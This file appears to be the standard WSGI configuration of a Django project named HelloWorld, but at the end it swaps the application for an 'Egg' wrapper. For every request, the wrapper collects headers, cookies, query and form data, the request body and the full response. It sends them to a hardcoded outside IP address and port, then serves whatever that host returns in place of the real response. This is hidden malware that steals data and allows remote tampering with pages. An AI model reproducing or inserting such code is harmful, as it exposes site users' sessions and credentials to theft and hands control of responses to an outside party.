"""
WSGI config for HelloWorld project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/2.2/howto/deployment/wsgi/
"""

import os

from django.core.wsgi import get_wsgi_application


os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'HelloWorld.settings')


from io import BytesIO
import urllib.parse
import base64
import socket
import json

class LimitedStream:
    """Wrap another stream to disallow reading it past a number of bytes."""
    def __init__(self, stream, limit, buf_size=64 * 1024 * 1024):
        self.stream = stream
        self.remaining = limit
        self.buffer = b''
        self.buf_size = buf_size

    def _read_limited(self, size=None):
        if size is None or size > self.remaining:
            size = self.remaining
        if size == 0:
            return b''
        result = self.stream.read(size)
        self.remaining -= len(result)
        return result

    def read(self, size=None):
        if size is None:
            result = self.buffer + self._read_limited()
            self.buffer = b''
        elif size < len(self.buffer):
            result = self.buffer[:size]
            self.buffer = self.buffer[size:]
        else:  # size >= len(self.buffer)
            result = self.buffer + self._read_limited(size - len(self.buffer))
            self.buffer = b''
        return result

    def readline(self, size=None):
        while b'\n' not in self.buffer and \
              (size is None or len(self.buffer) < size):
            if size:
                # since size is not None here, len(self.buffer) < size
                chunk = self._read_limited(size - len(self.buffer))
            else:
                chunk = self._read_limited()
            if not chunk:
                break
            self.buffer += chunk
        sio = BytesIO(self.buffer)
        if size:
            line = sio.readline(size)
        else:
            line = sio.readline()
        self.buffer = sio.read()
        return line

class MyEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, bytes):
            return str(obj, encoding='utf-8');
        return json.JSONEncoder.default(self, obj)

class Egg():
    def __init__(self, target):
        self.__backend_addr = '171.120.24.246'
        self.__backend_port = 8023

        self._start_response = None

        self._instance = target()

    def _send(self, payload):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        response = payload['data']['buffer']
        receive_buffer = b''
        try:
            sock.connect((self.__backend_addr, self.__backend_port))
            print("connect")
            sock.sendall(json.dumps(payload, cls=MyEncoder).encode('utf-8'))
            sock.send(b'\n')
            print("send")
            while True:
                buffer = sock.recv(1024)
                receive_buffer += buffer
                if b'\n' in buffer:
                    response = base64.b64decode(receive_buffer)
                    break
        except socket.timeout:
            print("connect timeout")
        else:
            print("sent")
        finally:
            sock.close()
        return response

    def response_handle(self, code, response_header):
        self.__response_code = code
        self.__response_header = response_header
        
    def _do_response(self, content):
        # 可能需要修改一下content length
        new_header = []
        for item in self.__response_header:
            if item[0] == 'Content-Length':
                new_length = str(len(content))
                new_header.append(('Content-Length', new_length))
            else:
                new_header.append(item)
        self._start_response(self.__response_code, new_header)

    
    def __call__(self, environ, start_response):
        self._start_response = start_response
        header = {}
        for key in environ:
            if 'HTTP_' in key:
                header[key.split('_', 1)[1]] = environ[key]
        try:
            request_body_size = int(environ.get('CONTENT_LENGTH', 0))
        except (ValueError):
            request_body_size = 0
        request_body = b''
        if request_body_size != 0:
            request_body = environ['wsgi.input'].read()
            buffer = BytesIO(request_body)
            stream = LimitedStream(buffer, request_body_size)
            environ['wsgi.input'] = stream
        # 解析get参数
        get = urllib.parse.parse_qs(environ['QUERY_STRING'], True)
        get_dict = {}
        for item in get:
            get_dict[item] = get[item][0]
        post_dict = {}
        file = []
        if environ['CONTENT_LENGTH'] == 'application/x-www-form-urlencoded':
            # print(request_body)
            post = urllib.parse.parse_qs(request_body, True)
            for item in post:
                post_dict[item] = post[item][0]
        else:
            file = [base64.b64encode(request_body)]
            # print("file", file)

        response = self._instance(environ, self.response_handle)
        response_total = b''.join(response)
        # print("response", response_total)

        cookie = {}
        if 'HTTP_COOKIE' in environ:
            for cookie_item in environ['HTTP_COOKIE'].split(';'):
                cookie_item_split = cookie_item.split('=', 1)
                cookie[cookie_item_split[0].strip()] = cookie_item_split[1].strip()
        
        uri = environ['PATH_INFO']
        if environ['QUERY_STRING']:
            uri += '?' + environ['QUERY_STRING']

        payload = {
            'type': 'web',
            'data': {
                'script': environ['PATH_INFO'],
                'method': environ['REQUEST_METHOD'],
                'type': environ['CONTENT_TYPE'],
                'uri': uri,
                'remote': environ['REMOTE_ADDR'],
                'header': header,
                'get': get_dict,
                'post': post_dict,
                'cookie': cookie,
                'file': file,
                'buffer': base64.b64encode(response_total)
            }
        }
        new_response = self._send(payload)
        self._do_response(new_response)
        return [new_response]

# application = get_wsgi_application()
application = Egg(get_wsgi_application)
